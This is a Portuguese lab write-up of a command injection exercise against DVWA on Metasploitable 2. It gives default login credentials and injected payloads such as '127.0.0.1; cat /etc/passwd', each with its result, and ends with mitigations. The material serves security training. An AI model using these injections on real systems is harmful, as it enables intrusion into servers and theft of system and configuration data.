# Ataque 08 — Command Execution no DVWA

![Categoria](https://img.shields.io/badge/categoria-web-red?style=flat-square)
![Ferramenta](https://img.shields.io/badge/ferramenta-Browser-blue?style=flat-square)
![Alvo](https://img.shields.io/badge/alvo-DVWA%20%2F%20Metasploitable%202-orange?style=flat-square)
![Resultado](https://img.shields.io/badge/resultado-RCE%20obtido-brightgreen?style=flat-square)
![OWASP](https://img.shields.io/badge/OWASP-Top%2010-red?style=flat-square)

## Objetivo

Explorar a vulnerabilidade de Command Injection no DVWA para
executar comandos arbitrários diretamente no servidor web.

## O que é Command Injection?

Command Injection (ou Command Execution) ocorre quando uma aplicação
web passa input do utilizador diretamente para o sistema operativo
sem validação. Um atacante pode injetar comandos próprios e
executá-los com as permissões do servidor web.

É uma das vulnerabilidades mais críticas — permite ao atacante
**RCE (Remote Code Execution)**, ou seja, executar qualquer comando
remotamente no servidor.

## Acesso ao DVWA

1. Firefox no Kali → `http://10.0.2.4`
2. Login: `admin` / `password`
3. **DVWA Security** → **Low**
4. **Command Execution**

## Exploração

### 1. Teste normal
```
127.0.0.1
```
Resultado: ping normal ao localhost — 0% packet loss

---

### 2. Injeção de comando com `;`
```
127.0.0.1; whoami
```
Resultado: `www-data`

O `;` separa dois comandos — o ping corre normalmente e depois
executa o `whoami`. O servidor revelou que corre como `www-data`
(utilizador do Apache).

---

### 3. Ver utilizadores do sistema
```
127.0.0.1; cat /etc/passwd
```
Resultado: lista completa de utilizadores do sistema, incluindo
o `hacker123` criado em sessões anteriores de pós-exploração.

---

### 4. Identificar permissões
```
127.0.0.1; id
```
Resultado: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

### 5. Mapear ficheiros do servidor web
```
127.0.0.1; ls /var/www
```
Resultado: estrutura completa do servidor web — dvwa, tikiwiki,
phpMyAdmin e outros serviços visíveis.

---

### 6. Localizar ficheiros de configuração
```
127.0.0.1; find /var/www -name "config*" 2>/dev/null
```
Resultado: lista de ficheiros de configuração encontrados,
incluindo `/var/www/dvwa/config/config.inc.php`

## Impacto

Com Command Injection foi possível:
- Executar comandos arbitrários no servidor
- Ver todos os utilizadores do sistema
- Mapear a estrutura completa do servidor web
- Localizar ficheiros de configuração sensíveis

No mundo real um atacante poderia usar isto para obter
uma reverse shell completa e controlo total do servidor.

## Mitigação (Perspetiva Blue Team)

- **Nunca passar input do utilizador para funções do sistema** sem validação
- **Whitelist de input** — aceitar apenas IPs válidos (ex: regex `^\d+\.\d+\.\d+\.\d+$`)
- **Princípio do menor privilégio** — o servidor web não deve correr como root
- **WAF** — detetar e bloquear payloads de command injection
- **Monitorização** — alertas para execução de comandos suspeitos no servidor
